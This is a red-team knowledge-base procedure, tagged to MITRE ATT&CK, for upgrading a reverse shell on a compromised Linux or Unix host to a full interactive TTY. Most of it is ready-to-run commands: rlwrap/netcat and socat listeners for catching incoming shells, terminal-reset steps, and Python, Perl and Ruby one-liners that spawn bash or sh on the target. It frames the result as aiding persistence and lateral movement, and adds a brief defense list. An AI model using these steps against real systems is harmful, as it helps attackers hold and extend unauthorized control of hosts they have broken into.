---
id: b9e86d7a-02f5-4ed0-86d9-6516f8d6c0f0
name: Spawn-TTY-Shell-from-Existing-Session
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:25.008476+00:00'
updated_at: '2023-04-10T20:25:31.223134+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Command-and-Scripting-Interpreter|T1059 - Command and Scripting
    Interpreter]]
sub_techniques: []
tags:
  - '[[tags/Reverse Shell]]'
  - '[[tags/Spawn TTY Shell]]'
  - post-exploitation
  - shell-upgrade
commands:
  - '[[commands/install-rlwrap-on-ubuntu]]'
  - '[[commands/clear-terminal-screen-ctrl-l]]'
  - '[[commands/rlwrap-nc-connect-to-host]]'
  - '[[commands/rlwrap-nc-with-history-completion]]'
  - '[[commands/install-socat-on-ubuntu]]'
  - '[[commands/socat-tcp-listener-on-port]]'
platforms:
  - Linux
  - Unix
tools: []
validated: true
---

# Spawn-TTY-Shell-from-Existing-Session

## Summary

This procedure upgrades a basic reverse shell to a fully interactive TTY shell, enabling better control, command history, and tab completion during post-exploitation activities. It covers listener setup with netcat or socat, backgrounding and resetting the shell, and spawning TTY via common interpreters like Python, Perl, and Ruby.

## Description

In penetration testing or red team operations, initial reverse shells often lack TTY support, limiting functionality like arrow key navigation or screen resizing. This procedure spawns a pseudo-TTY (PTY) from an existing non-interactive shell session, inheriting the parent process's privileges. It targets Unix-like systems (Linux, macOS) where interpreters like Python are commonly available. The approach involves backgrounding the shell, resetting terminal attributes, and using built-in modules to spawn `/bin/bash` or `/bin/sh`. This enhances persistence and lateral movement by providing a stable command environment without requiring additional uploads.

## Requirements

1. Established reverse shell session on the target (e.g., via netcat or Python one-liner).
2. Attacker machine with netcat (nc), rlwrap, and socat installed for improved listener interaction.
3. Target system with common interpreters (Python 3, Perl, Ruby, or Lua) and `/bin/sh` or `/bin/bash` accessible.
4. Network connectivity for bidirectional communication (TCP port open on attacker side).

## Defense

- Enable process auditing (e.g., auditd on Linux) to log shell spawns and interpreter executions.
- Monitor for unusual network connections from interpreters (e.g., Python processes binding to ports).
- Implement AppArmor/SELinux to restrict shell spawning from non-standard processes.
- Use endpoint detection tools to flag backgrounded processes (Ctrl+Z) followed by fg/resets.

## Objectives

1. Establish a stable listener for incoming shell connections.
2. Upgrade the non-interactive shell to a full TTY with editing capabilities.
3. Verify interactive features like command history and tab completion.
4. Maintain session stability for further post-exploitation tasks.

## Instructions

### Step 1: Install rlwrap for Enhanced Netcat Interaction

**Context**: rlwrap adds readline support to netcat, enabling command history and editing in the listener shell. Install it on the attacker machine if not present.

**Command** ([[commands/install-rlwrap-on-ubuntu]]):
```bash
sudo apt-get install rlwrap
```

> This installs rlwrap via apt on Debian-based systems. Expected output: Package installation confirmation. Verify with `rlwrap --version`.

### Step 2: Clear the Terminal Screen

**Context**: Before starting the listener, clear the screen for a clean view of incoming connections.

**Command** ([[commands/clear-terminal-screen-ctrl-l]]):
```bash
# Press Ctrl + L
```

> This shortcut clears the terminal output. Expected output: Blank screen with prompt at top.

### Step 3: Set Up Netcat Listener with rlwrap

**Context**: Start a TCP listener to catch the reverse shell. Use rlwrap for better usability; specify a port like 4242.

**Command** ([[commands/rlwrap-nc-connect-to-host]]):
```bash
rlwrap nc -nlvp 4242
```

> Listens on port 4242 in verbose mode. Expected output: "Listening on [0.0.0.0] (family 0, port 4242)". Once connected, you'll see the target's shell prompt.

For history completion:

**Command** ([[commands/rlwrap-nc-with-history-completion]]):
```bash
rlwrap -r -f . nc -nlvp 4242
```

> The -r flag adds input/output words to completion list; -f . uses current history file. Expected output: Same as above, but with tab completion enabled.

### Step 4: Install Socat for Alternative Listener

**Context**: Socat provides more robust TTY handling than netcat. Install if preferred for the listener.

**Command** ([[commands/install-socat-on-ubuntu]]):
```bash
sudo apt-get install socat
```

> Installs socat. Expected output: Package confirmation.

### Step 5: Set Up Socat TCP Listener

**Context**: Use socat to create a raw TTY listener on a specific port, ideal for direct shell forwarding.

**Command** ([[commands/socat-tcp-listener-on-port]]):
```bash
socat file:`tty`,raw,echo=0 tcp-listen:12345
```

> Binds to port 12345 with raw TTY mode (no echo). Expected output: Waiting for connection; upon connect, interactive shell appears.

### Step 6: Background and Reset the Shell for TTY Upgrade

**Context**: In the reverse shell, background it (Ctrl+Z), then reset terminal settings to enable TTY features.

Run these in sequence on the target shell:

```bash
# Background the shell
stty raw -echo
fg
reset
export SHELL=bash
export TERM=xterm-256color
stty rows $(tput lines) columns $(tput cols)
```

> Background with Ctrl+Z first, then echo terminal info with `echo $TERM && tput lines && tput cols`. Use stty to set raw mode, foreground with fg, reset, and export variables. Expected output: Shell prompt with full TTY support (arrow keys work, screen resizes).

### Step 7: Spawn TTY Using Available Interpreters

**Context**: If the shell lacks TTY, use an interpreter to spawn one. Test Python first, as it's often available.

In the target shell, try:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Or alternatives:

```bash
python3 -c "__import__('pty').spawn('/bin/bash')"
perl -e 'exec "/bin/sh";'
ruby -e 'exec "/bin/sh"'
```

> These spawn a PTY-backed bash/sh. Expected output: New shell prompt with `export TERM=screen` or similar; test with `ls` and arrow keys. If Python unavailable, fall back to Perl/Ruby.
